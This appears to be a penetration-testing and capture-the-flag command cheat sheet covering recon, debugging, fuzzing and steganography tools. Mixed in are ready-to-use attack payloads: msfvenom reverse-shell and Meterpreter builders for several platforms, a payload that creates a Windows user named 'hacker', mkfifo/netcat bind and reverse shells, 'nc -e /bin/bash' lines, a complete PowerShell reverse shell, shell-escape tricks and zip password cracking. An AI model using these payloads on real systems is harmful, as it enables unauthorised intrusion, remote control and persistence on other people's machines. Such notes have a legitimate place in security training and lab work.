##########################################

Commands/tools used frequently

##########################################


# AWK

```awk 'NR=[LineNumber]' <file>``` : Get that line of file

# BINWALK

Binwalk is a tool for searching a given binary image for embedded files and executable code.

```binwalk [OPTIONS] [FILE1]```

```binwalk -e [FILE1]``` : extract file

```binwalk -Me [FILE1]``` : recursively extract files


# CEWL
CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers

cewl -d 2 -m 5 -w docswords.txt https://example.com

# CURL

curl -A "<user-agent-string>" <url> : to set specific user agent through curl

# FIND

```find / -name flag* | grep "password"``` : Find files in / directory called flag with any character afterwards. and grep those files for password.

```find / -perm -u=s -type f 2>/dev/null``` : Find files with SUID bit set (-g=s SGID, for set group id) in / send errors to null.

# GDB

gdb <program-name> : Start gdb with program

set exec-wrapper env -u LINES -u COLUMNS : any exploit you make inside gdb will work outside of gdb after doing this.

run : run program

info functions : list functions

disassemble function-name : show function (same as radare 2 pdf @<function> )
  
b * main+39 : put breakpoint at main funciton + 39 (numbers shown when you do info function.)

i r : show registers

step :  step through program

continue : continue program

clear : delete breakpoint

print : print out value or expression

next : Debugger will execute the next line as single instruction


# Google Dorks

```site:<sitename> 'word'``` : Search within particular site

```filetype:pdf``` : Search for particular filetype

```cache:<sitename>``` : View cached version
  
```intitle:<phrase>``` : Appears in title

```eg intitle:index of``` 

# Gobuster

```gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt``` : basic gobuster enumeration

```gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt -a <useragent>``` : -a to change useragent used

```gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt -p <proxy-url>```  : -p to set a proxy like burpsuite to capture all requests

```gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt -P <password> -U <username>```  : username and password for basic authentication

```gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt -H 'Header1: val1' -H 'Header2: val2'``` : specify custom headers

# GREP

```grep -rnw <directory> -e <string>``` 

```grep -r /dev -e '4bceb.\{27\}'``` : String starting with 4bceb of length 32. (len(4bceb) + 27 = 32)

```grep -- <-n>``` : Grepping a string with dash (such as -n) needs double dash first. 

*-r : Recursive, read  all  files under each directory
*-w : Select only those lines containing matches that form  whole words.  The test is that the matching substring must either be at the beginning of the line, or preceded by a  non-word constituent character.  Similarly, it must be either at the end of the line  or  followed  by  a  non-word  constituent character.    Word-constituent   characters   are  letters, digits, and the underscore.  This option has no  effect  if -x is also specified.
*-a : Process  a  binary  file  as  if  it  were  text
*-i : Ignore  case  distinctions
*-e : Interpret pattern as an extended regular expression

# HEXEDITOR

To change file magic numbers etc

```hexeditor <file>```

# IP ROUTE

```route``` : show routing table

```ip route show``` : show routes

```sudo ip route add <network-address-cidr-notation> via <gateway> dev <interface-name>``` : add route with this and same command for delete

# MSFVENOM

## One liner

```msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.103 lport=1111 R``` : One-liner raw payload, can be used in places like command injection. 

## Binaries Payloads

```msfvenom -l``` : List payloads

```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > shell.elf``` : Linux Meterpreter Reverse Shell

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe```: Windows Meterpreter Reverse TCP Shell

```msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho > shell.macho``` : Mac Reverse Shell

## Web Payloads

PHP Meterpreter Reverse TCP
```msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php```
```cat shell.php | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php```

```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp``` : JSP Java Meterpreter Reverse TCP


## Scripting Payloads

```msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py``` : Python Reverse Shell

```msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh``` : Bash Unix Reverse Shell

## Shellcode

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>``` : Windows Meterpreter Reverse TCP Shellcode

```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>``` : Linux Meterpreter Reverse TCP Shellcode

```msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>``` : Mac Reverse TCP Shellcode

## Create User

```msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe``` > adduser.exe

## Metasploit Handler
use exploit/multi/handler

set PAYLOAD <Payload name>
  
Set RHOST <Remote IP>
  
set LHOST <Local IP>
  
set LPORT <Local Port>
  
Run

# MKFIFO

```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` : bind shell

```mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` : reverse shell

# MySQL

```mysql -u username -p password -h ip``` : connect to mysql service with username and password

# NETCAT

```nc -lvnp 192.168.1.1 8181``` : Create listener 

```nc <LOCAL-IP> <PORT> -e /bin/bash``` : Execute bash on connection 

```nc 192.168.1.2 8181``` : Bind to listener @ 192.168.1.2:8181

```nc -lvnp <PORT> -e /bin/bash``` : Execute bash on connection to listener. Can be used as bind shell

note: -e is not included in most versions of netcat due to its insecurity. On windows can use a static binary, while on linux we can use.

# NMAP 

```nmap <IP> -sU``` : Nmap UDP scan 

```nmap <IP> -oA filename``` : Output the nmap scan in 3 major formats 

```nmap -p- -SV -A <IP>``` : Nmap scan to do service and OS detection and scan all ports 

[https://www.stationx.net/nmap-cheat-sheet/]

[https://highon.coffee/blog/nmap-cheat-sheet/]

# Nikto

```nikto -h <IP>```

# Directories of interest (linux)

```/etc/```

```/etc/passwd```

```/etc/fstab```

```/etc/hosts```

```/etc/init.d```

```/usr/sbin```

[https://www.digitalocean.com/community/tutorials/how-to-use-passwd-and-adduser-to-manage-passwords-on-a-linux-vps]

display the first few lines of a file ```head file.txt```
display the last few lines of a file ```tail file.txt```

# POWERSHELL

```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"``` : powershell reverse shell

# Radare 2

```r2 -d <program>``` : Start program in radare2
  
```aaa``` : analyze program

```afl``` : list of functions from program

```pdf @<function-name>``` : Go to function from list

```db <memory location>``` : breakpoint

```ds``` : step through

```dc``` : start program execution/and run again after breakpoint

```dr``` : show register values

```px @ <variable>``` : show memory for entered variable

# SCP


```scp your_username@remotehost.edu:foobar.txt /some/local/directory``` : Copy the file "foobar.txt" from a remote host to the local host

```scp foobar.txt your_username@remotehost.edu:/some/remote/directory``` : Copy the file "foobar.txt" from the local host to a remote host


# Spanning a TTY shell

```python -c 'import pty; pty.spawn("/bin/sh")'```

```echo os.system('/bin/bash')```

```/bin/sh -i```

```perl —e 'exec "/bin/sh";'```

```perl: exec "/bin/sh";```

```ruby: exec "/bin/sh"```

lua: ```os.execute('/bin/sh')```

```exec "/bin/sh"``` : (From within IRB)

```:!bash``` : (From within vi)

```:set shell=/bin/bash:shell``` : (From within vi)

```!sh``` : (From within nmap)

# Web-Server

```Python -m SimpleHTTPServer 80``` : Spins up a webserver in the directory you are located on port 80.

```Python3 -m http.server 80``` : Spins up a python version 3.X web server in the directory you are located on port 80.

```Python -m pyftpdlib -p 21 -w``` : Spins up a FTP server in the directory you are located on port 21 and it allows anonymous login access.

```Python3 -m pyftpdlib -p 21 -w``` : Spins up a Python 3.X FTP server in the directory you are located on port 21 and it allows anonymous login access.

# Wfuzz
Web application bruteforcer it can be used for finding resources not linked directories, servlets, scripts, etc, bruteforce GET and POST parameters for checking different kind of injections. https://wfuzz.readthedocs.io/en/latest/index.html

```wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 http://192.168.1.1/FUZZ/ > output.txt``` 
* -c : Shows the output in color, 
* -z : Specifies what will replace FUZZ in the request. For example -z file,big.txt will read through all the lines of big.txt and replace FUZZ with, 
* --hc : Don't show certain http response codes

sudo apt-get install wfuzz

pip3 install wfuzz

# ZIP2JOHN

```zip2john encrypted.zip > encrypted.hash``` : get hashed password out of zip archive.

```john --show encrypted.hash``` : Use john to crack password.

# ZSTEG
detect stegano-hidden data in PNG & BMP: 

```zsteg [options] filename.png [param_string]```



